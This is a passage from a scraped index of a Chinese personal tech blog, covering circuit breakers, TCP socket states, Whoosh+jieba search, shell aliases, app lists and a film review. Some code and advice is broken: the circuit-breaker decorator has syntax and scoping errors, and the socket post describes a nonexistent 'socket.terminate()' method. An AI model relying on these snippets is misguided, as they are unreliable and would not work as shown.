熔断的方式有很多，最出名的奶飞的 hystrix 项目里有很全面的实践，这里便先列个比较偷懒的案例。 举个栗子， # Elastic search service decorator def api_trend(func): def wrapper(*args, **kwargs): # Call elastic search service to get api trend elastic_search_api_call() # Custom function return func(*args, **kwargs) return wrapper # Custom task to do stuff @api_trend def custom_func(foo): retrun foo() 假设代码中的 @api_trend 是个调用 Elastic Search 服务来监控 api 执行情况的装饰器，那么如果 Elastic Search 服务挂了，则后续的 custom_func(foo) 也不会成功执行或者被阻塞。所以我们需要做的就是阻止后续的程序继续调用 @api_trend 或者 elastic_search_api_call() 这两位老哥，把 custom_func(foo) 隔离开，这样虽然暂时失去了监控，但是仍能保证业务能正常执行。 所以基于这点，我们可以简单地加个熔断控制器开关来隔离故障接口。 from threading import Timer # Melt down flag FUSE = True # Melt down recover func def recover(): FUSE = True return # Melt down decorator def melt_down(threshold=5, inteval=60, timeout=300, recover_time=3600): def wrap_melt(func): def wrapper(*args, **kwargs): is_fuse = True while threshold \u003e 0 and is_fuse: try: func(timeout, *args, **kwargs) is_fuse = False exception Exception, e: is_fuse = True threshold -= 1 continue time.sleep(inteval) FUSE = is_fuse if not FUSE: tr = threading.Timer(recover_time, recover) tr.start() return FUSE return wrapper return wrap_melt # Elastic search service decorator def api_trend(func): def wrapper(*args, **kwargs): # Call elastic search service to get api trend if FUSE: elastic_search_api_call() # Custom function return func(*args, **kwargs) return wrapper # Custom task to do stuff @melt_down @api_trend def custom_func(foo): return foo() 通过在调用 @api_trend 之前加上熔断控制器，进行目标服务的接口调用，如果在规定的重试次数内均未成功，则认为该服务在这一段时间内不可用，对于该 api 的所有调用全都用一个 FUSE_FLAG 进行隔离，并且设置一个定时 Thread, 在一定时间后重新打开 FUSE_FLAG，恢复目标服务的调用。 ","date":"2018-02-01","objectID":"/zh-cn/service-fallback/:1:2","tags":["Service","Architecture","Linux"],"title":"坦率地讲 服务熔断 \u0026 服务降级","uri":"/zh-cn/service-fallback/"},{"categories":["Architecture","Code"],"content":"服务降级 当服务器压力剧增的情况下，根据当前业务情况及流量对一些服务和页面有策略的降级，以此释放服务器资源以保证核心任务的正常运行。 对于复杂系统而言，会有很多的微服务通过 rpc 调用，从而产生一个业务需要一条很长的调用链，其中任何一环故障了都会导致整个调用链失败或超时而导致业务服务不可用或阻塞。 这种情况下，可以暂时去掉调用链中故障的服务来进行降级，其中降级策略又有很多种，比如限流，接口拒绝等，这里就挑个简单的来举栗。 比如一个电商系统，用户模块，商品模块，订单模块，支付模块，物流模块分别是5个存在相互依赖性的服务，但是如果用户要下单购买个商品则可能需要一条长调用链依次 Call 到这5个模块。 # Call chain user = UserModule.sender.get_user() product = ProductModule.sender.get_product(user.selected) order = OrderModule.sender.post_order(product) payment = PaymentModule.sender.post_payment(order) logistics = LogisticsModule.sender.post_logistics(payment) 这时候如果物流模块崩了，那么很可能在最终购买商品的流程会被回滚，导致用户购买商品不成功，然而实际上，物流模块即便失效，仍应允许进行商品查看，下单，购买等，所以，坦率地讲，我们应该对这5个模块进行一个上下游依赖的剥离，使之变为纯净的 rpc 调用。 简单地说， from xmlrpclib import ServerProxy MODULE_TO_ENABLE = [ 'UserAgent', 'ProductAgent', 'OrderAgent', 'PaymentAgent', 'LogisticsAgent' ] def custom_call(): return foo() def call_nothing(): return class LogisticsAgent(object): self.sender = ServerProxy(\"http://{host}:{port}\".format(host=host, port=port)) if self.__class__.__name__ in MODULE_TO_ENABLE: self.sender.call = custom_call else: self.sender.call = call_nothing pass # Call chain if self.current_agent not in MODULE_TO_ENABLE: pass 这样通过 diable Call chain 中不重要的一环来确保其他模块可以正常使用。 ","date":"2018-02-01","objectID":"/zh-cn/service-fallback/:1:3","tags":["Service","Architecture","Linux"],"title":"坦率地讲 服务熔断 \u0026 服务降级","uri":"/zh-cn/service-fallback/"},{"categories":["Code","Python"],"content":"浅谈 Workflow 设计 LexusLee ","date":"2017-12-03","objectID":"/zh-cn/workflow-design/:1:0","tags":["Python","Workflow"],"title":"浅谈 Workflow 设计","uri":"/zh-cn/workflow-design/"},{"categories":["Code","Python"],"content":"背景 最近刚接触到 workflow 相关的东西，之前都没有造过这方面的轮子，所以看了一些框架总结了一下我认为的好的 Workflow 的设计应该是怎样的。 ","date":"2017-12-03","objectID":"/zh-cn/workflow-design/:1:1","tags":["Python","Workflow"],"title":"浅谈 Workflow 设计","uri":"/zh-cn/workflow-design/"},{"categories":["Code","Python"],"content":"什么是 Workflow ? Workflow 是一些可重复执行的事件按特定的顺序\u0026路径组合成的事件流，这个组成的事件流通常是为了满足某一个流程较长的任务。 这些事件通常是不可再被细分，是具有原子性的。每个原子事件可能包含执行任务、文档或数据。这些事件按照提前声明好的规则组合起来就成了一个 Workflow . e.g. 如上图所示，Workflow 类似软件工程中的流程图，指定了每个节点可能出现的路径分支，节点执行的事情以及节点的终结状态。 ","date":"2017-12-03","objectID":"/zh-cn/workflow-design/:1:2","tags":["Python","Workflow"],"title":"浅谈 Workflow 设计","uri":"/zh-cn/workflow-design/"},{"categories":["Code","Python"],"content":"如何设计 Workflow ? 比较经典的 Workflow design pattern 应该满足以下几个元素： 路径覆盖 事件原子性 有效的状态迁移 路径覆盖 路径覆盖是和节点状态相关的，通常的节点状态有如下几种： Start —— 开始 jobs ，标明 workflow 起点 Maybe —— 表示这个任务可能会执行，但不一定会执行，它的执行依赖于一定条件，比如上层节点的输出 Likely —— 和 Maybe 节点类似，但是比它的优先级更高，是作为与 Maybe 节点共享父节点的默认路径节点 Future —— 表示 workflow 执行体认为该路径一定会到达的节点，Future 节点的任务在不被 cancel 的情况下一定会执行 Waiting —— 表示当前任务是个阻塞任务，还在执行中，需要等待执行完毕才能进入下个路径 Ready —— 表示 Waiting 节点的任务已执行完，作为 Waiting 节点的 handler Complete —— 表示整个 workflow 的 Jobs 已经全部执行完毕，为终结节点 Cancel —— 表示任务被明确终止了，在状态迁移过程中不作为最终状态 事件原子性 pass ","date":"2017-12-03","objectID":"/zh-cn/workflow-design/:1:3","tags":["Python","Workflow"],"title":"浅谈 Workflow 设计","uri":"/zh-cn/workflow-design/"},{"categories":["Gossip"],"content":"《向阳处的她》浩介先生终于有猫啦！ 有一年的搞笑诺贝尔物理学奖颁给了课题： 「一只猫能同时处于固体状态和液体状态吗？」 通过第三人称视角研究了猫的各种形态，《向阳处的她》这部电影就给研究了一个狠狠的耳光。 初看预告的时候，我觉得剧情有点俗气了，尽是那些小年轻喜欢听的清新治愈系故事。 从大笨钟一样有仪式感的电车中眺望初冬阳光下的漫无边际的江之岛，海鸥擦着行人的帽檐飞过，整个江之岛臣服在他们身后清冽的疾风中，满心都是光怪陆离的感觉。 在整部电影边缘哑光的胶片镜头下，这种自然和工艺碰撞的部分，让男主浩介和女主真绪在一起的每一刻回忆都清晰起来。 想起了有间破旧的猫屋，在清晨穿过黑黢黢的山路，第一次遇见了那只俄罗斯蓝猫，灰扑扑毛绒绒的。 雾气和露水都凉，它却暖乎乎的，抱在手里，甜蜜轻佻地抬头望着你。 这样的眼波，实在太熟悉了。 这也算每个猫奴的终极梦想吧， 能和自己的主子一起享受这些瞬间，吃酒抱猫，真是快意。 不过作为一只猫来说，它能记住的东西寥寥。 真绪也是。 真绪和浩介只能讲一个阅后即焚的故事，讲完了，便谁也记不得了。 一整个篇幅的起承转合喜怒哀乐，长的看不见头，甜的美不胜收，却就这么消失了，空虚极了。 所以，我喜欢一切永恒的事物，结局一定要是完美的，相逢在爱乐之城最后淡蓝色的酒吧里，高司令一定要冲下去，拉着她的手，说出另一个时间线里的那句话，“天呐我的老伙计啊我们在一起吧我再也不要错过你！” 可惜不是，高司令最后那张波澜不惊的脸，似笑非笑地看着错过的美景，却没有冲下去至少道个别。 我讨厌这种隔岸观火的结局，这让人感觉所有的付出都像是徒劳。 那些不再提起的好或者坏，等于从未发生过。 我想浩介一开始，也不享受这种的感觉。 所以他和我一样，本能地抗拒这种别离。 一想到过去一起亲历的风景会变成大脑中的未解之谜，就忍不住仓皇地逃离。 你看，这就是不通达的人啊。 我常常会纠结于那些曾经走过的路，铺过的床，抽过的耳光，夜半的心慌，愚蠢的结果和湿不开的枕巾。 却忘了任何一种情绪的发生，都是当下的体验，那些快乐的、痛苦的、失望的，早就驻留在我记忆中很久很久了。 「“即使回忆会消失，还是要努力去经历创造回忆的过程啊”」 「要当人类就必须做一些徒劳的事吧”」 日落时的余晖在湖面闪烁出莹莹的水光，有关真绪的回忆像水波一样散去。 突然就理解了人生最漫长而陈杂的部分，我们带着好奇心一步步走来，也多么希望有些事情能够变成永恒的，即便终是徒劳的，但亲爱的至少有机会和你一起经历了一段记忆。 可能只一句话或者一个动作，挺淡的，不至于教人常常想起。但只要想起来就觉得心头一暖，可以支撑我走过很多很冷的日子。 ​​​​ 就像片尾曲一样，Wouldn’t it be nice. ","date":"2017-09-25","objectID":"/zh-cn/girl-in-the-sunny-place/:1:0","tags":["Gossip","Movie"],"title":"《向阳处的她》浩介先生终于有猫啦！","uri":"/zh-cn/girl-in-the-sunny-place/"},{"categories":["Linux","Code"],"content":"关于关闭 Socket 的一些坑 LexusLee ","date":"2017-09-06","objectID":"/zh-cn/tcp-close-socket/:1:0","tags":["TCP","Linux"],"title":"关于关闭 Socket 的一些坑","uri":"/zh-cn/tcp-close-socket/"},{"categories":["Linux","Code"],"content":"背景 最近踩到一个 “Socket 连接持续处于 Fin_Wait2 和 Close_Wait 状态无法关闭” 的坑中。起因是在维护大量连接时调用 socket.close() 时，看到部分连接并没有正常关闭，而是从 ESTABLISHED 的状态变成 FIN_WAIT2 并且连接状态没有后续迁移，而对端的连接状态则是从 ESTABLISHED 变成了 CLOSE_WAIT 。 后来发现这和 TCP/IP 栈的4次挥手断开连接有关，列出一些踩坑时的收获。 ","date":"2017-09-06","objectID":"/zh-cn/tcp-close-socket/:1:1","tags":["TCP","Linux"],"title":"关于关闭 Socket 的一些坑","uri":"/zh-cn/tcp-close-socket/"},{"categories":["Linux","Code"],"content":"Socket 连接关闭的流程 先看一张 Socket 关闭连接的状态迁移路径图: 在 Client 端调用 socket.close() 时，首先会往对端(即 Server 端)发送一个 FIN 包，接着将自身的状态置为 FIN_WAIT1 ，此时主动关闭端(即 Client 端)处于持续等待接收对端的响应 FIN 包的 ACK 回应状态，此时对端的状态是处于 ESTABLISHED ，一旦收到了 Client 发来的 close 连接请求，就回应一个 FIN 包，表示收到该请求了，并将自身状态置为 CLOSE_WAIT，这时开始等待 Server 端的应用层向 Client 端发起 close 请求。 这时 Client 端一旦收到 Server 端对第一个 FIN 包的回应 ACK 就会将进入下一个状态 FIN_WAIT_2 来等待 Server 发起断开连接的 FIN 包。在FIN_WAIT_1 的 time_wait 中， Server 端会发起 close 请求，向 Client 端发送 FIN 包，并将自身状态从 CLOSE_WAIT 置为 LAST_ACK ，表示 Server 端的连接资源开始释放了。同时 Client 端正处于 FIN_WAIT2 状态，一旦接收到 Server 端的 FIN 包，则说明 Server 端连接已释放，接着就可以释放自身的连接了，于是进入 TIME_WAIT 状态，开始释放资源，在经过设置的 2个 MSL 时间后，状态最终迁移到 CLOSE 说明连接成功关闭，一次 TCP 4次挥手 关闭连接的过程结束。 通常会出现状态滞留的情况有下面几种: Client 处于 FIN_WAIT1 , Server 处于 ESTABLISHED =\u003e 这种情况通常是连接异常，socket.close() 发送的 FIN 包对端无法收到。由于 TCP FIN_WAIT 自身有 Timeout, 在 Timeout 后如果还没有收到响应，则会停止等待。这种情况在 DDoS 攻击中比较常见，Server 端在某一时刻需要处理大量 FIN_WAIT1 时就会卡死。解决方法是修改 /etc/sysctl.conf 的 net.ipv4.tcp_fin_timeout 来提高 Timeout 值，保证大量连接能正常在超时时间内收到响应，当然这对服务器负载有要求。而如果是异常 ip 在某时间段内发送大量流量的 DDoS 攻击，则可以在 iptable 上手动封 ip 或者开启防火墙。 Client 处于 FIN_WAIT2, Server 处于 CLOSE_WAIT =\u003e 这种情况通常是 Server 端还在使用连接进行读写或资源还未释放完，所以还没主动往对端发送 FIN 包进入 LAST_ACK 状态，连接一直处于挂起的状态。这种情况需要去检查是否有资源未释放或者代码阻塞的问题。通常来说 CLOSE_WAIT 的持续时间应该较短，如果出现长时间的挂起，那么应该是代码出了问题。 Client 出于 TIME_WAIT, Server 处于 LAST_ACK =\u003e 首先 TIME_WAIT 需要等待 2个 MSL (Max Segment Lifetime) 时间，这个时间是确保 TCP 段能够被接收到的最大寿命。默认是 60 s 。解决方案是: 1. 调整内核参数 /etc/sysctl.conf 中的 net.ipv4.tcp_tw_recycle = 1 确保 TIME_WAIT 状态的连接能够快速回收，或者缩短 MSL 时间。 2. 检查是否有些连接可以使用 keepalive 状态来减少连接数。 此外，如果在单台服务器上并且不做负载均衡而处理大量连接的话，可以在 /proc/sys/net/ipv4/ip_local_port_range 中减少端口的极限值，限制每个时间段的最大端口使用数，从而保证服务器的稳定性，一旦出现大量的 TIME_WAIT 阻塞后续连接，是比较致命的。 ","date":"2017-09-06","objectID":"/zh-cn/tcp-close-socket/:1:2","tags":["TCP","Linux"],"title":"关于关闭 Socket 的一些坑","uri":"/zh-cn/tcp-close-socket/"},{"categories":["Linux","Code"],"content":"Socket.terminate() 和 Socket.close() 此外还遇到了另一个小问题，在关闭连接时，一开始用的是 socket.terminate() ，然而 netstat 时却发现大量连接没有释放，后来发现 Python Socket 的 terminate() 只是发送 socket.SHUT_WR 和 socket.SHUT_RD 来关闭通道的读写权限而并没有释放连接句柄。导致了连接已经无法使用，但仍然处于 ESTABLISHED 状态。 解决方法就是使用 socket.close() 来替换 socket.terminate() 后来又看到如果是 DDoS 攻击的话，可能会阻塞住 socket.close() ，导致后续连接未关闭，大量流量进入服务器。 所以比较好的方式是在 socket.close() 之前先调用 socket.terminate() 关闭通道的读写权限，再调用 socket.close() ","date":"2017-09-06","objectID":"/zh-cn/tcp-close-socket/:1:3","tags":["TCP","Linux"],"title":"关于关闭 Socket 的一些坑","uri":"/zh-cn/tcp-close-socket/"},{"categories":["Design"],"content":"Sketch 锤子水箱图标仿制心得 ","date":"2017-08-22","objectID":"/zh-cn/sketch-icon-understanding/:1:0","tags":["Icon","Sketch"],"title":"Sketch 锤子水箱图标仿制心得","uri":"/zh-cn/sketch-icon-understanding/"},{"categories":["Design"],"content":"背景 第一次按照教程走了一遍，发现做出来的颜色、高光和饱和方面都很差，拟物化的感觉不是很明显。 ","date":"2017-08-22","objectID":"/zh-cn/sketch-icon-understanding/:1:1","tags":["Icon","Sketch"],"title":"Sketch 锤子水箱图标仿制心得","uri":"/zh-cn/sketch-icon-understanding/"},{"categories":["Design"],"content":"第二次修改心得 接着私信问了下大牛意见，再加上自己对比官方图，总结了几个修改点： 水箱外边框应该用深色来突显波纹的\"反光” 水箱边框的外阴影应该用过饱和的颜色来突出在黑色幕布下的力度 水箱内圈应该再加一层内嵌阴影来表达拟物化的层次感 气泡的构造！！！越深的气泡饱和度应该越高而透明度应该越低，这样贴近整个水波纹的颜色，而在水面的气泡容易和被水面的底材颜色覆盖，所以应该多加一层外边框做高亮，所以气泡应该分两层处理，水底和水面 icon 的波纹扭曲程度应该更夸张些 本身水箱整体的颜色是冷色系偏暗，所以 icon 颜色上应该有反差，不应该用原来黑色的，而应该换成白色的 下面是第二次修改后的图，整体感觉拟物化的效果好了一些 ","date":"2017-08-22","objectID":"/zh-cn/sketch-icon-understanding/:1:2","tags":["Icon","Sketch"],"title":"Sketch 锤子水箱图标仿制心得","uri":"/zh-cn/sketch-icon-understanding/"},{"categories":["Productivity"],"content":"LexusLee ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:0","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"背景 很久不用 Windows 开发，最近刚入职开发环境在 Windows 上，故列举了一下我自己开发机上安装的一些实用 app ，方便以后直接按清单上整个世界。 也算是一波安利了 ：D ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:1","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"IDE Pycharm (Python) PhpStorm (PHP) Webstorm (Javascript) Sublime + happypeter Sublime Config (Front-end) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:2","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"终端 Windows 的终端和系统命令真是 real 难用，从 Linux 切换过来很不习惯，气死了！！！ Rapid Environment Editor (Windows 环境变量配置工具，免去每次都到我的电脑里的繁杂操作) oh-my-zsh (一开始发现有相关的 hack 但是发现只适用于 Win10 ，由于Win7没有Bash 故删除) Cmder + Powershell (Terminal集成) Chocolatey (类似于 apt-get / yum 这种的包管理工具) Xshell (SSH登录) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:3","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"Python Tool pip (第三方库管理) virtualenv (Python 环境隔离) supervisor (Python 进程控制, 搭配 Nginx 食用更佳！) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:4","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"数据库工具 Navicat (一个GUI可同时管理MySQL, PgSQL 等主流数据库) DataGrip (JetBrains 的 SQL 神器，用来管理和编写 SQL ) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:5","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"测试 Postman (测试接口神器，我的 Chrome 是自带了) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:6","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"代码管理 Git SourceTree (Git GUI) Beyond Compare(神器，对比查看文件修改) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:7","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"GTD 管理 我一直保持着 GTD 记录的习惯，所以蛮依赖这些 app 的，因人而异吧，有些人喜欢自己管理时间。 momentum (一个轻便的 chrome 插件，每次打开新 Tab 标签都能看到今天制定的任务)、 Doit.im (一个在线的 GTD 网站，免去多平台同步的麻烦，今年一直在用这个) Inkdrop (桌面便签提醒) Slack (主要用到我自己写的日程提醒 slack bot) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:8","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"听歌 主要是解决版权问题，所以使用了两个客户端。 网易云音乐 (国内) Spotify (国外) Pandora (国外, 解决 Spotify 地域限制问题) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:9","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"视频 VLC (开源垃圾桶 media app) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:10","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"文档写作 Typora (Markdown写作) 印象笔记 (主要是用到它的多平台同步，用于和我自己的电脑同步文档) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:11","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Productivity"],"content":"让你的 Windows 体验更佳！ 敲黑板！！ 下面这些工具可能直接和开发工具不相关，但是可以提高开发速度和开发心情！感觉 Windows 搭配这些 app 用起来就和柯基的屁股一样滑。 这里是我参照少数派上的一篇文章: 这 8 款应用，让 Windows 也拥有 OS X 的优秀特性 整理的我自己比较喜欢的第三方系统增强应用，让 Windows 用起来体验超爽！ 公司的内网自带科学上网，真是超级 Nice ！所以我就不说 赛风 psiphon3 (一个支持多平台的免费的科学上网工具) Wox + Everything (类似于Win10小娜和 MacOS 上的 Alfred，但是比小娜好处在于更准确的 Everything 的多磁盘检索，并且可以自定义插件，像我这种电影狂热分就很需要豆瓣电影的插件) Seer (按一下空格即可进行文件快速预览，在文件命名很杂乱时有用🏊) MacType (把 Windows 超难看的默认宋体字体改成了渲染后圆滑的 Console 字体) Virgo (虚拟桌面，仿 MacOS 分屏使用，当一个桌面应用多到放不下，就按下 ALT+1/2/3/4 轻松切屏 ) AutoHotKey (用于自定义快捷键，把app里那些反人类的快捷键赶紧改了吧！) F.lux (自动调节屏幕亮度) ","date":"2017-07-08","objectID":"/zh-cn/awesome-windows-apps/:0:12","tags":["Productivity","Awesome"],"title":"Awesome Windows Apps","uri":"/zh-cn/awesome-windows-apps/"},{"categories":["Code","Architecture"],"content":"PySpark 词频统计搜索引擎的设计思路 记录下我的思路 ","date":"2017-05-09","objectID":"/zh-cn/spark-search-engine/:1:0","tags":["Spark","Architecture"],"title":"PySpark 词频统计搜索引擎的设计思路","uri":"/zh-cn/spark-search-engine/"},{"categories":["Code","Python"],"content":"Whoosh + jieba 中文检索 ","date":"2017-04-26","objectID":"/zh-cn/whoosh-search/:1:0","tags":["Python","Whoosh","Jieba"],"title":"Whoosh+jieba 中文检索","uri":"/zh-cn/whoosh-search/"},{"categories":["Code","Python"],"content":"背景 最近项目要用到 Whoosh 一个 Python 编写的索引检索模块，发现比较少中文资料并且看了学长的代码也好多不懂，故自己照着官网文档撸了一遍，把我自己的理解和官网一些不太清楚的解释写下来。 ","date":"2017-04-26","objectID":"/zh-cn/whoosh-search/:1:1","tags":["Python","Whoosh","Jieba"],"title":"Whoosh+jieba 中文检索","uri":"/zh-cn/whoosh-search/"},{"categories":["Code","Python"],"content":"快速上手 几个核心对象 Index 和 Schema 对象 在使用 Whoosh 前，首先需要创建的就是 index 对象，index 对象是一个全局索引。在创建 index 对象前首先要声明 index 对象的一些属性，所以需要在创建一个用于包装这些属性的 schema 对象。schema 有很多 Fields(一个 Field 是 index 对象的一个信息块，即需要被我们检索的内容) 举个栗子，以下代码创建了一个包含 “title” 和 “path” 和 “content” 三个 Fields 的 schema 对象 from whoosh.fields import Schema, TEXT, ID schema = Schema(title=TEXT, path=ID, content=TEXT) 创建 schema 对象时需要用关键字来映射 Field name 和 Field type，如上的 title=TEXT 一旦创建好了 schema 对象，接着就是使用 create_in 方法来创建 schema 的索引 import os.path from whoosh.index import create_in if not os.path.exists(\"index\"): os.mkdir(\"index\") idx = create_in(\"index\", schema) 接着可以用以下两种方法打开一个已创建的索引 # 方法一 使用FileStorage对象 from whoosh.filedb.filestore import FileStorage storage = FileStorage(idx_path) #idx_path 为索引路径 idx = storage.open_index(indexname=indexname, schema=schema) # 方法二 使用open_dir函数 from whoosh.index import open_dir idx = open_dir(indexname=indexname) #indexname 为索引名 IndexWriter 对象 一旦有了 index 对象，我们就需要在 index 里写入需要被检索的信息，所以 IndexWriter 对象就是用来提供一个 add_document(**kwargs) 方法来在之前声明的各种 Fields 里写入数据 writer = idx.writer() #IndexWriter对象 writer.add_document( title=u\"Document Title\", path=u\"/a\", content=u\"Hello Whoosh\" ) # Field 和 schema 中声明的一致 writer.commit() # 保存以上document 需要注意的是： 不是每个 Field 都要赋值 Field 传值一定是 unicode 类型的值 如果有一个 Field 同时要被当做索引并保存之，那么可以用一个 unicode 值来做索引同时保存另一个对象 writer.add_document(title=u\"Title to be indexed\", _stored_title=u\"Stored title\") 如果需要异步处理可以创建异步的 IndexWriter 对象 from whoosh.writing import AsyncWriter writer = AsyncWriter(index=index) 如果需要Buffer进行处理可以创建 BufferedWriter 对象 from whoosh.writing import BufferedWriter # period是多次commit的最大间隔时间，limit是需要缓存的最大数量 writer = BufferedWriter(index=index, period=120, limit=20) Searcher 对象 在开始搜索索引之前，我们需要创建 searcher 对象 searcher = idx.sercher() 但是一般来说不会这么创建搜索器 searcher ，这样做没法来索引检索完成后关闭搜索器释放内存(只要知道 searcher 很吃内存就行)，我们一般用 with 来创建 searcher 对象从来保证搜索器使用完毕后可以被正确关闭 with idx.sercher() as searcher: ... 以上写法等同于 try: searcher = idx.searcher() ... finally: searcher.close() 搜索器的 search() 方法需要传入一个 Query 对象，我们可以直接构造一个 Query 对象或者使用 query parser 来解析一个查询字段 举个栗子 # 直接构造查询对象 from whoosh.query import * myquery = And([Term(\"content\", u\"apple\"), Term(\"content\", \"bear\")]) 默认的 QueryParser 允许使用查询原语 AND 和 OR 和 NOT 就像 SQL 一样简单！ # 使用解析器解析查询字段 from whoosh.qparser import QueryParser parser = QueryParser(\"content\", idx.schema) myquery = parser.parse(querystring) 构造完查询对象后，就可以使用搜索器的 search() 方法来进行检索 results = searcher.search(myquery) print(results[0]) {\"title\": \"Document\", \"content\": \"Hello Whoosh\"} 更通常的我们使用分页查询 search_page() 的方法 results = searcher.search_page(myquery, page_num, page_len) 结合 jieba 分词使用 Whoosh 的基本用法如上，接着我要在 QueryString 中加入结巴分词分析模块 由于 jieba 0.30 之后的版本已经添加用于 Whoosh 的分词接口: ChineseAnalyzer, 所以还是很方便的 首先在 Whoosh schema 对象的创建的 whoosh.fields.TEXT，默认的声明 TEXT 时字段的 FieldAttributes 默认有个属性 analyzer analyzer 是一个带有 call 魔术方法的类，用来进行 TEXT 词域的分析，在调用时会把 TEXT 域里的值进行 call 处理 analyzer 接收的参数是一个 unicode 字符串，返回值是字符串切分，举个栗子 e.g.( ​ param = “Mary had a little lamb” ​ return = [“Mary”, “had”, “a”, “little”, “lamb”] ) 使用的是 Whoosh 的 StandardAnalyzer ，是英文的分词器。为了对接上 jieba，做中文分词，需要把 TEXT(analyzer=analysis.StandardAnalyzer()) 换成 jieba 的 ChineseAnalyzer 即可 from __future__ import unicode_literals from jieba.analyse import ChineseAnalyzer analyzer = ChineseAnalyzer() schema = Schema(title=TEXT(stored=True), path=ID(stored=True), content=TEXT(stored=True, analyzer=analyzer)) idx = create_in(\"test\", schema) writer = idx.writer() writer.add_document( title=\"test-document\", path=\"/c\", content=\"This is the document for test\" ) writer.commit() searcher = idx.searcher() parser = QueryParser(\"content\", schema=idx.schema) for keyword in (\"水果\",\"你\",\"first\",\"中文\",\"交换机\",\"交换\"): print(\"result of \",keyword) q = parser.parse(keyword) results = searcher.search(q) for hit in results: print(hit.highlights(\"content\")) print(\"=\"*10) 还是很方便的。 ","date":"2017-04-26","objectID":"/zh-cn/whoosh-search/:1:2","tags":["Python","Whoosh","Jieba"],"title":"Whoosh+jieba 中文检索","uri":"/zh-cn/whoosh-search/"},{"categories":["Linux","Code"],"content":"终端配置总结 ","date":"2017-03-30","objectID":"/zh-cn/terminal-config/:1:0","tags":["Linux","Config","Terminal"],"title":"终端配置总结","uri":"/zh-cn/terminal-config/"},{"categories":["Linux","Code"],"content":"背景 最近公司新购置了好几台 Linux 服务器然后配置一些服务的时候很不习惯，估计是我平时自己的 zsh + oh-my-zsh 用多了，故想整理下 .bash_rc 和 .zshrc 我个人的一些配置，这些配置包含了一些 alias 快捷命令和命令行系统配置，可以让终端变得快捷易用，今晚再写个 shell 脚本实现快速修改 .bash_rc 的配置。 ","date":"2017-03-30","objectID":"/zh-cn/terminal-config/:1:1","tags":["Linux","Config","Terminal"],"title":"终端配置总结","uri":"/zh-cn/terminal-config/"},{"categories":["Linux","Code"],"content":".bash_rc/.zshrc 配置汇总 终端不自动执行命令 # If not running interactively, don't do anything case $- in *i*) ;; *) return;; esac .bash_history 文件(同理 .zsh_history )不重写而是使用附加模式记录命令 # append to the history file, don't overwrite it shopt -s histappend 增加 .bash_history 、 .zsh_history 文件记录阈值，超过阈值后自动清空 HISTFILESIZE=2000 根据命令行长短自动调节终端行列显示排版 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize 开启适合编程的命令行提示 feature if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi 常用的 alias 声明 — 简写部分 比较容易懂。 alias cls='clear' alias vi='vim' alias ll='ls -l' alias la='ls -a' 常用的 alias 声明 — 效果增强部分 这部分让 ls 和 grep 都带有关键字亮色的提示，让 alert 提示的错误信息在终端中显示起来更友好。 alias ls='ls --color=auto' alias grep='grep --color=auto' alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] \u0026\u0026 echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;\u0026|]\\s*alert$//'\\'')\"' 常用的 alias 声明 — 效果增强部分2 这部分增加了在 MacOS 系统中显示和隐藏文件的快捷命令，和在终端中切换 bash 和 zsh 的快捷命令。 alias showfile='defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finde r' alias hidefile='defaults write com.apple.finder AppleShowAllFiles -boolean false ; killall Find er' alias switchbash='chsh -s /bin/bash' alias switchzsh='chsh -s /bin/zsh' 全部的配置汇总如上，一是方便我自己做个备份，二是大家可以按需使用。 ","date":"2017-03-30","objectID":"/zh-cn/terminal-config/:1:2","tags":["Linux","Config","Terminal"],"title":"终端配置总结","uri":"/zh-cn/terminal-config/"},{"categories":["Gossip"],"content":"如果大脑有一套日志系统就好了 ","date":"2016-07-16","objectID":"/zh-cn/brain-log-system/:1:0","tags":["Gossip"],"title":"如何大脑有一套日志系统就好了","uri":"/zh-cn/brain-log-system/"},{"categories":["Gossip"],"content":"背景 